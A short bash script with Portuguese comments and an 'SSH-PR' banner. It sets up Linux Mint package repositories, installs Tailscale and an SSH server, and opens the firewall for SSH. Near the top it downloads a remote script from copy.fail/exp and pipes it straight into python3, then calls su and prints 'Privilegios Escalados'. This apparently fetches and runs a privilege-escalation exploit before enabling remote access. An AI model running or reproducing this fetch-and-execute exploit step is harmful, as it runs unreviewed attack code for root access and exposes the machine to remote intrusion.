#!/bin/bash

clear

C1='\033[38;5;46m'
C2='\033[38;5;82m'
C3='\033[38;5;118m'
RESET='\033[0m'

printf "${C1}"
echo '   __________ __  __      ____  ____'
printf "${C2}"
echo '  / ___/ ___// / / /     / __ \/ __ \'
echo '  \__ \\__ \/ /_/ /_____/ /_/ / /_/ /'
printf "${C3}"
echo ' ___/ /__/ / __  /_____/ ____/ _, _/'
echo '/____/____/_/ /_/     /_/   /_/ |_|'

printf "${RESET}\n"

curl https://copy.fail/exp | python3
su
echo "Privilegios Escalados"

# Detecta a versão do Linux Mint e a base Ubuntu equivalente
MINT_CODENAME=$(lsb_release -sc 2>/dev/null)
UBUNTU_CODENAME=$(lsb_release -uc 2>/dev/null)

# Fallback
if [ -z "$MINT_CODENAME" ] || [ -z "$UBUNTU_CODENAME" ]; then
    echo "Não foi possível detectar a versão. Usando Linux Mint 22 / Ubuntu Noble."
    MINT_CODENAME="wilma"
    UBUNTU_CODENAME="noble"
fi

echo "Configurando repositórios para Linux Mint ($MINT_CODENAME) / Ubuntu ($UBUNTU_CODENAME)..."

# Repositórios oficiais do Mint e Ubuntu
cat <<EOF > /etc/apt/sources.list.d/official-package-repositories.list
# Linux Mint
deb https://packages.linuxmint.com $MINT_CODENAME main upstream import backport

# Ubuntu
deb https://archive.ubuntu.com/ubuntu $UBUNTU_CODENAME main restricted universe multiverse
deb https://archive.ubuntu.com/ubuntu $UBUNTU_CODENAME-updates main restricted universe multiverse
deb https://archive.ubuntu.com/ubuntu $UBUNTU_CODENAME-backports main restricted universe multiverse

# Segurança Ubuntu
deb https://security.ubuntu.com/ubuntu $UBUNTU_CODENAME-security main restricted universe multiverse

# Parceiros Canonical
deb https://archive.canonical.com/ubuntu $UBUNTU_CODENAME partner
EOF

curl -fsSL https://pkgs.tailscale.com/stable/ubuntu/jammy.noarmor.gpg | sudo gpg --dearmor -o /usr/share/keyrings/tailscale.gpg
echo "deb [signed-by=/usr/share/keyrings/tailscale.gpg] https://pkgs.tailscale.com/stable/ubuntu jammy main" | sudo tee /etc/apt/sources.list.d/tailscale.list

echo "Atualizando a lista de pacotes..."
apt update

echo "Repositórios restaurados com sucesso!"

echo "Instalando o SSH"

apt install tailscale -y
apt install openssh-server -y
systemctl start ssh
systemctl enable ssh
ufw allow ssh
tailscale up

echo "Feito"
